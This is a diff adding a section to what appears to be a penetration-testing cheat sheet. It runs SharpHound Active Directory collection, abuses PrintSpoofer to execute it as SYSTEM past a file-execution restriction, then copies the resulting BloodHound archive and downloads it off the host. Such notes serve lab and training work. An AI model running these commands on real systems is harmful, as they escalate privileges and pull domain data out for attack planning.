@@ -14,6 +14,28 @@ Import-Module .\SharpHound.ps1
 
 # BloodHound
 Invoke-BloodHound -CollectionMethod All
+----------------------
+# Windows Based (SharpHound.exe)
+# Run it
+.\SharpHound.exe -c All
+```
+
+## Running SharpHound with PrintSpoofer Abuse
+```bash
+upload SharpHound.exe
+
+#Unable to run due to restriction on running files. Abuse printspoofer.
+.\PrintSpoofer64.exe -i -c "cmd /c C:\Users\eric.wallows\Documents\SharpHound.exe -c All"
+
+#NOTE: Printspoofer runs as System32, so the file will be saved there since we did not specify an output.
+# Find file
+ls C:\Windows\System32\*.zip
+
+# Copy it over to Documents folder
+copy C:\Windows\System32\20260407171325_BloodHound.zip C:\Users\eric.wallows\Documents\BloodHound.zip
+
+# Download
+download BloodHound.zip
 ```
 ## Transfer File to Kali with Impacket SMB Server
 ```bash
